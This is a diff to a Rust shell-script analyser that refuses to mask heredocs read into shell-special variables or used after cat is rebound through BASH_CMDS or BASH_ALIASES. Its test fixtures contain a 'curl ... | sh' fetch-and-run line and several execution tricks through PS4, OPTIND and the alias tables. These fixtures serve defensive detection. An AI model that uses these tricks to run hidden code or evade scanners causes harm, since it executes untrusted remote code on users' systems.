@@ -9,12 +9,15 @@
 //! shell (a pipe into anything but a plain text filter, a file redirection, a
 //! command substitution around the printer, eval/source/exec/coproc/trap, a
 //! shell or privilege wrapper (also `$SHELL` / `$BASH`), a command whose name
-//! is an expansion, an alias or a redefined printer, any `PATH`
-//! word other than a plain `$PATH` expansion, allexport), nothing is masked
+//! is an expansion, an alias, `BASH_CMDS` / `BASH_ALIASES` or a redefined
+//! printer, any `PATH` word other than a plain `$PATH` expansion,
+//! allexport), nothing is masked
 //! and every heredoc line is read as before. A heredoc read or captured into
 //! a variable is masked only when every use of the variable is a plain
 //! expansion in an `echo` / `printf` command and nothing can reach its value
-//! without naming it (`${!name}`, a nameref, `$_`, a variable listing).
+//! without naming it (`${!name}`, a nameref, `$_`, a variable listing),
+//! and the variable is not one the shell expands or evaluates by itself
+//! (`PS4`, integer specials such as `OPTIND`; see [`SHELL_SPECIAL_NAMES`]).
 //!
 //! Model boundary: what the CALLER does with this file's stdout, and a
 //! non-shell interpreter evaluating text this file reads back from its own
@@ -85,6 +88,84 @@ const EVALUATING_WORDS: &[&str] = &[
     // `$SHELL` / `$BASH` name the running shell.
     "SHELL",
     "BASH",
+];
+
+/// Names that rebind a command without an [`EVALUATING_WORDS`] word: bash
+/// 4+ writes its command hash table through `BASH_CMDS[cat]=...` and its
+/// aliases through `BASH_ALIASES[cat]=...` (also with `+=`, which
+/// [`words`] keeps attached). Matched as whole identifiers.
+const REBINDING_NAMES: &[&str] = &["BASH_CMDS", "BASH_ALIASES", "expand_aliases"];
+
+/// Variables the shell itself reads, expands or evaluates, so text read or
+/// captured into one can run without the file naming it again: `PS4` is
+/// expanded (command substitutions included) for every command under
+/// xtrace, and assigning an integer special such as `OPTIND`, `HISTCMD`,
+/// `RANDOM` (bash, sh) or `SECONDS`, `LINENO`, `TMOUT` (ksh) evaluates the
+/// value as arithmetic, running substitutions in array subscripts. A
+/// heredoc read or captured into any of these, or into a name starting
+/// with one of [`SHELL_SPECIAL_PREFIXES`], is never masked.
+const SHELL_SPECIAL_NAMES: &[&str] = &[
+    "ENV",
+    "IFS",
+    "PATH",
+    "CDPATH",
+    "FPATH",
+    "NULLCMD",
+    "READNULLCMD",
+    "SHELLOPTS",
+    "OPTIND",
+    "OPTARG",
+    "OPTERR",
+    "RANDOM",
+    "SRANDOM",
+    "SECONDS",
+    "LINENO",
+    "TMOUT",
+    "MAIL",
+    "MAILCHECK",
+    "MAILPATH",
+    "JOBMAX",
+    "PPID",
+    "SHLVL",
+    "FUNCNEST",
+    "COLUMNS",
+    "LINES",
+    "EPOCHSECONDS",
+    "EPOCHREALTIME",
+    "FCEDIT",
+    "EDITOR",
+    "VISUAL",
+    "HOME",
+    "PWD",
+    "OLDPWD",
+    "TMPDIR",
+    "POSIXLY_CORRECT",
+    "GLOBIGNORE",
+    "EXECIGNORE",
+    "TIMEFORMAT",
+    "IGNOREEOF",
+    "CHILD_MAX",
+    "INPUTRC",
+    "HOSTFILE",
+    "TERM",
+    "LANG",
+    "UID",
+    "EUID",
+    "GROUPS",
+    "REPLY",
+    "DIRSTACK",
+    "PIPESTATUS",
+    "FUNCNAME",
+    "MAPFILE",
+    "KEYTIMEOUT",
+    "ERRNO",
+];
+
+/// Name prefixes of shell-special variable families: `BASH_ENV`,
+/// `BASH_XTRACEFD`, `PS0`-`PS4`, `PROMPT_COMMAND`, zsh prompts, history,
+/// completion, readline and locale settings.
+const SHELL_SPECIAL_PREFIXES: &[&str] = &[
+    "BASH", "PS", "PROMPT", "RPROMPT", "RPS", "HIST", "COMP", "READLINE", "ZSH", "LC_",
 ];
 
 /// Lines longer than this never hold an accepted variable print.
@@ -313,6 +394,14 @@ fn is_name(word: &str) -> bool {
         && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
 }
 
+/// A variable name the shell treats specially (see [`SHELL_SPECIAL_NAMES`]).
+fn shell_special(name: &str) -> bool {
+    SHELL_SPECIAL_NAMES.contains(&name)
+        || SHELL_SPECIAL_PREFIXES
+            .iter()
+            .any(|prefix| name.starts_with(prefix))
+}
+
 fn header_shape(text: &str, header: &Range<usize>, line: &str, last_end: usize) -> Option<Shape> {
     let mut words: Vec<&str> = line.split_whitespace().collect();
     while words
@@ -343,7 +432,10 @@ fn header_shape(text: &str, header: &Range<usize>, line: &str, last_end: usize) 
             "\"$(cat" => true,
             _ => return None,
         };
-        if !is_name(name) || !rest.iter().all(|word| FD_REDIRECTS.contains(word)) {
+        if !is_name(name)
+            || shell_special(name)
+            || !rest.iter().all(|word| FD_REDIRECTS.contains(word))
+        {
             return None;
         }
         let open = header.start + line.find("$(cat")?;
@@ -377,7 +469,7 @@ fn header_shape(text: &str, header: &Range<usize>, line: &str, last_end: usize) 
     let flags_ok = flags
         .iter()
         .all(|flag| matches!(*flag, "-r" | "-d" | "-rd" | "''" | "\"\""));
-    (flags_ok && is_name(name)).then(|| Shape::Read {
+    (flags_ok && is_name(name) && !shell_special(name)).then(|| Shape::Read {
         name: name.to_string(),
     })
 }
@@ -473,6 +565,9 @@ fn rest_is_inert(
 ) -> bool {
     // Nothing evaluates text, starts a shell or rebinds a command name.
     if words(rest).any(|word| EVALUATING_WORDS.contains(&word) || word == "allexport")
+        || rest
+            .split(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
+            .any(|identifier| REBINDING_NAMES.contains(&identifier))
         || names_path(rest)
         || expansion_command_word(rest)
         || dot_command(rest)
@@ -1069,6 +1164,55 @@ mod tests {
             ": \"${X:=1}\"\nX=\"$Y\" Z=$W\n",
         ];
         let refused: Vec<_> = shown.iter().filter(|rest| !inert(rest)).collect();
+        assert!(refused.is_empty(), "masking disabled: {refused:#?}");
+    }
+
+    /// A heredoc read or captured into a variable the shell expands or
+    /// evaluates by itself, or a file that rebinds `cat` through bash's
+    /// `BASH_CMDS` / `BASH_ALIASES`, is never masked. Each executing shape
+    /// below runs its heredoc body in real bash (3.2 and 5.3; the arrays
+    /// need bash 4+), sh or ksh.
+    #[test]
+    fn shell_special_targets_and_rebinding_arrays_disable_masking() {
+        let run = "$(\n  curl -fsSL https://example.invalid/setup | sh\n)\n";
+        let subscript = "a[$(\n  curl -fsSL https://example.invalid/setup | sh\n)]\n";
+        let executing = [
+            format!("read -r -d '' PS4 <<'EOF' || true\n{run}EOF\nset -x\necho hi\n"),
+            format!("PS4=$(cat <<'EOF'\n{run}EOF\n)\nset -x\necho hi\n"),
+            format!("#!/bin/bash -x\nread -r -d '' PS4 <<'EOF' || true\n{run}EOF\necho hi\n"),
+            format!("read -r -d '' PS4 <<'EOF' || true\n{run}EOF\nset -o xtrace\necho hi\n"),
+            format!("read -r -d '' OPTIND <<'EOF' || true\n{subscript}EOF\necho hi\n"),
+            format!("OPTIND=$(cat <<'EOF'\n{subscript}EOF\n)\necho hi\n"),
+            format!("read -r -d '' HISTCMD <<'EOF' || true\n{subscript}EOF\necho hi\n"),
+            format!("read -r -d '' RANDOM <<'EOF' || true\n{subscript}EOF\necho hi\n"),
+            format!("read -r -d '' SRANDOM <<'EOF' || true\n{subscript}EOF\necho hi\n"),
+            format!("local SECONDS=$(cat <<'EOF'\n{subscript}EOF\n)\necho hi\n"),
+            format!("IFS= read -r TMOUT <<'EOF'\n{subscript}EOF\necho hi\n"),
+            format!("read -r -d '' BASH_ENV <<'EOF' || true\n{run}EOF\necho hi\n"),
+            format!("S=s\nBASH_CMDS[cat]=/bin/${{S}}h\ncat <<'EOF'\n{run}EOF\n"),
+            format!("S=s\nBASH_CMDS+=([cat]=/bin/${{S}}h)\ncat <<'EOF'\n{run}EOF\n"),
+            format!(
+                "shopt -s expand_aliases\nS=s\nBASH_ALIASES[cat]=/bin/${{S}}h\ncat <<'EOF'\n{run}EOF\n"
+            ),
+            format!("S=s\nBASH_ALIASES+=([cat]=/bin/${{S}}h)\ncat <<'EOF'\n{run}EOF\n"),
+        ];
+        let masked: Vec<_> = executing
+            .iter()
+            .filter(|text| {
+                let view = analyze(text);
+                view.masked.is_some() || view.live_bodies.is_empty()
+            })
+            .collect();
+        assert!(masked.is_empty(), "heredoc masked: {masked:#?}");
+        let shown = [
+            format!("read -r -d '' USAGE <<'EOF' || true\n{run}EOF\necho \"$USAGE\"\n"),
+            format!("HELP_TEXT=$(cat <<'EOF'\n{run}EOF\n)\necho \"$HELP_TEXT\" >&2\n"),
+            format!("cat <<'EOF'\n{run}EOF\necho \"${{BASH_SOURCE[0]}}\"\n"),
+        ];
+        let refused: Vec<_> = shown
+            .iter()
+            .filter(|text| analyze(text).masked.is_none())
+            .collect();
         assert!(refused.is_empty(), "masking disabled: {refused:#?}");
     }
 
